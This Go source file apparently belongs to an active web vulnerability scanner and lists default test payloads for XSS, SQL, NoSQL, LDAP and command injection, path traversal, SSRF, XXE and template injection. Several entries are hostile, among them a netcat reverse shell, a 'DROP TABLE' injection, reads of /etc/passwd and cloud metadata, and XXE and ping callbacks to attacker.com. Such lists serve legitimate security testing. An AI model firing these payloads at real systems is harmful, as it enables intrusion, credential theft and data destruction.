package active

// Payload represents a test case for active scanning.
type Payload struct {
	Name    string
	Content string
	Type    string // e.g., SQLi, XSS
}

// GetDefaultPayloads returns a comprehensive list of security testing payloads.
func GetDefaultPayloads() []Payload {
	return []Payload{
		// --- Cross-Site Scripting (XSS) ---
		{"XSS Basic", "<script>alert(1)</script>", "XSS"},
		{"XSS IMG", "<img src=x onerror=alert(1)>", "XSS"},
		{"XSS SVG", "<svg onload=alert(1)>", "XSS"},
		{"XSS Body", "<body onload=alert(1)>", "XSS"},
		{"XSS Iframe", "<iframe onload=alert(1)></iframe>", "XSS"},
		{"XSS Input", "<input onfocus=alert(1) autofocus>", "XSS"},
		{"XSS Details", "<details ontoggle=alert(1)>", "XSS"},
		{"XSS Video", "<video src=x onerror=alert(1)>", "XSS"},
		{"XSS Audio", "<audio src=x onerror=alert(1)>", "XSS"},
		{"XSS Object", "<object data='javascript:alert(1)'>", "XSS"},
		{"XSS Link", "<a href='javascript:alert(1)'>click me</a>", "XSS"},
		{"XSS Meta", "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", "XSS"},
		{"XSS Div", "<div onmouseover=alert(1)>hover me</div>", "XSS"},
		{"XSS Table", "<table background='javascript:alert(1)'>", "XSS"},
		{"XSS Style", "<style>@import 'javascript:alert(1)';</style>", "XSS"},
		{"XSS Generic Script", "\";alert(1)//", "XSS"},
		{"XSS Polyglot 1", "javascript://%250Aalert(1)//", "XSS"},
		{"XSS Polyglot 2", "<sCRipt>alert(1)</sCrIpT>", "XSS"},
		{"XSS Polyglot 3", "\"><script>alert(1)</script>", "XSS"},
		{"XSS Polyglot 4", "'><script>alert(1)</script>", "XSS"},
		{"XSS Angular", "{{$on.constructor('alert(1)')()}}", "XSS"},
		{"XSS Vue", "{{constructor.constructor('alert(1)')()}}", "XSS"},

		// --- SQL Injection (SQLi) ---
		{"SQLi Auth Bypass 1", "' OR '1'='1", "SQLi"},
		{"SQLi Auth Bypass 2", "\" OR \"1\"=\"1", "SQLi"},
		{"SQLi Auth Bypass 3", "admin' --", "SQLi"},
		{"SQLi Auth Bypass 4", "admin' #", "SQLi"},
		{"SQLi Union Generic", "' UNION SELECT 1,2,3--", "SQLi"},
		{"SQLi Union MySQL", "' UNION SELECT 1,@@version,3--", "SQLi"},
		{"SQLi Union PostgreSQL", "' UNION SELECT 1,version(),3--", "SQLi"},
		{"SQLi Generic Error", "'", "SQLi"},
		{"SQLi Time MySQL", "' AND SLEEP(5)--", "SQLi"},
		{"SQLi Time PostgreSQL", "' AND 5=(SELECT 5 FROM pg_sleep(5))--", "SQLi"},
		{"SQLi Time MSSQL", "'; WAITFOR DELAY '0:0:5'--", "SQLi"},
		{"SQLi Stacked", "'; DROP TABLE users--", "SQLi"},
		{"SQLi Comment 1", "'/**/OR/**/1=1--", "SQLi"},
		{"SQLi Comment 2", "' OR 1=1#", "SQLi"},
		{"SQLi Hex Encoded", "0x27204f5220313d31", "SQLi"},

		// --- Path Traversal / LFI ---
		{"LFI Basic Unix", "../../../../etc/passwd", "LFI"},
		{"LFI Basic Windows", "..\\..\\..\\..\\windows\\win.ini", "LFI"},
		{"LFI Null Byte", "../../../../etc/passwd%00", "LFI"},
		{"LFI Wrapper PHP Filter", "php://filter/convert.base64-encode/resource=index.php", "LFI"},
		{"LFI Wrapper PHP Input", "php://input", "LFI"},
		{"LFI Wrapper ZIP", "zip://shell.jpg%23payload.php", "LFI"},
		{"LFI Encoded 1", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "LFI"},
		{"LFI Encoded 2", "%252e%252e%252fetc%252fpasswd", "LFI"},
		{"LFI UTF-8", "..\u2215..\u2215etc\u2215passwd", "LFI"},
		{"LFI Proc Self", "/proc/self/environ", "LFI"},
		{"LFI Boot.ini", "c:\\boot.ini", "LFI"},

		// --- Command Injection (CMDi) ---
		{"CMDi Basic Unix 1", "; id", "CMDi"},
		{"CMDi Basic Unix 2", "; cat /etc/passwd", "CMDi"},
		{"CMDi Basic Windows 1", "& dir", "CMDi"},
		{"CMDi Basic Windows 2", "& ipconfig", "CMDi"},
		{"CMDi Pipe", "| whoami", "CMDi"},
		{"CMDi Backtick", "`whoami`", "CMDi"},
		{"CMDi Substitution", "$(whoami)", "CMDi"},
		{"CMDi Netcat Reverse", "; nc -e /bin/sh 10.0.0.1 1234", "CMDi"},
		{"CMDi Python", "; python -c 'import socket...'", "CMDi"},
		{"CMDi Timeout", "; sleep 5", "CMDi"},
		{"CMDi OOB DNS", "; ping -c 1 attacker.com", "CMDi"},

		// --- Server-Side Request Forgery (SSRF) ---
		{"SSRF Localhost 1", "http://localhost", "SSRF"},
		{"SSRF Localhost 2", "http://127.0.0.1", "SSRF"},
		{"SSRF Localhost 3", "http://0.0.0.0", "SSRF"},
		{"SSRF Localhost 4", "http://[::1]", "SSRF"},
		{"SSRF AWS Meta", "http://169.254.169.254/latest/meta-data/", "SSRF"},
		{"SSRF GCP Meta", "http://metadata.google.internal/computeMetadata/v1/", "SSRF"},
		{"SSRF Azure Meta", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "SSRF"},
		{"SSRF Oracle Meta", "http://192.0.0.192/latest/", "SSRF"},
		{"SSRF DigitalOcean Meta", "http://169.254.169.254/metadata/v1.json", "SSRF"},
		{"SSRF File Scheme", "file:///etc/passwd", "SSRF"},
		{"SSRF Gopher", "gopher://localhost:6379/_SLAVEOF...", "SSRF"},
		{"SSRF Dict", "dict://localhost:11211/stat", "SSRF"},

		// --- XML External Entity (XXE) ---
		{"XXE Basic", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "XXE"},
		{"XXE Billion Laughs", "<!DOCTYPE lolz [<!ENTITY lol \"lol\">...]>", "XXE"},
		{"XXE OOB", "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>", "XXE"},
		{"XXE SVG", "<svg xmlns=\"http://www.w3.org/2000/svg\"...>", "XXE"},

		// --- Server-Side Template Injection (SSTI) ---
		{"SSTI Jinja2 Basic", "{{7*7}}", "SSTI"},
		{"SSTI Jinja2 Config", "{{config.items()}}", "SSTI"},
		{"SSTI Java EL", "${7*7}", "SSTI"},
		{"SSTI Freemarker", "${7*7}", "SSTI"},
		{"SSTI Velocity", "#set($x=7*7)${x}", "SSTI"},
		{"SSTI Twig", "{{7*'7'}}", "SSTI"},

		// --- NoSQL Injection ---
		{"NoSQL NE q", "{\"$ne\": null}", "NoSQLi"},
		{"NoSQL GT q", "{\"$gt\": \"\"}", "NoSQLi"},
		{"NoSQL Where", "{\"$where\": \"sleep(5000)\"}", "NoSQLi"},
		{"NoSQL Regex", "{\"$regex\": \".*\"}", "NoSQLi"},
		{"NoSQL Or", "{\"$or\": [1,1]}", "NoSQLi"},

		// --- LDAP Injection ---
		{"LDAP Search All", "*", "LDAPi"},
		{"LDAP Admin", "admin*)((|user=password", "LDAPi"},
		{"LDAP Null", "admin*)((|user=*", "LDAPi"},

		// --- Polyglots ---
		{"Polyglot XSS/SQLi", "\"'><script>alert(1)</script> OR 1=1--", "Polyglot"},
		{"Polyglot Generic", "javascript:/*--></title></style></textarea></script><script>alert(1)//", "Polyglot"},
	}
}
